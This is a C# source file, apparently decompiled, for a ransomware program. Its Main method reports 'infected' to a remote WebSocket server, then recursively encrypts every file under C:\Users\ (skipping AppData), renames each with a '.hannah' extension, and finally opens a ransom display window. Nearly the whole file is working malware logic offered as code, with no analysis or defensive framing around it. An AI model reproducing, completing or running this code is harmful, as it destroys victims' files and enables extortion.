using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Newtonsoft.Json;
using WebSocketSharp;

namespace Cockblocker;

internal class Program
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public cmd(string name, string args)
		{
			_name = name;
			_args = args;
		}
	}

	private static byte[] Encrypt(byte[] toEncryptBytes, string encryptionKey)
	{
		return Encryption.EncryptBytes(toEncryptBytes, encryptionKey);
	}

	private static void EncryptDir(string dir, string key)
	{
		try
		{
			foreach (string item in Directory.EnumerateFiles(dir))
			{
				Console.WriteLine("Encrypting " + item + "!");
				if (!item.EndsWith(".hannah"))
				{
					try
					{
						File.WriteAllBytes(item, Encrypt(File.ReadAllBytes(item), key));
						File.Move(item, item + ".hannah");
						Globals.encrypted.Add(item + ".hannah");
					}
					catch
					{
					}
				}
				else
				{
					Console.WriteLine("Not encrypting " + item + " Already encrypted. ");
				}
			}
			string[] directories = Directory.GetDirectories(dir);
			foreach (string text in directories)
			{
				if (!text.Contains("AppData"))
				{
					EncryptDir(text, key);
				}
			}
		}
		catch
		{
			Console.WriteLine("Cannot encrypt " + dir);
		}
	}

	private static void Main(string[] args)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Ok");
		Globals.ws.add_OnMessage((EventHandler<MessageEventArgs>)Globals.Ws_OnMessage);
		Globals.ws.Connect();
		Globals.ws.Send(JsonConvert.SerializeObject((object)new cmd("infected", "")));
		Thread.Sleep(10000);
		EncryptDir("C:\\Users\\", Globals.Keys.PublicKey);
		Application.Run((Form)(object)new RansomwareDisplay());
	}
}
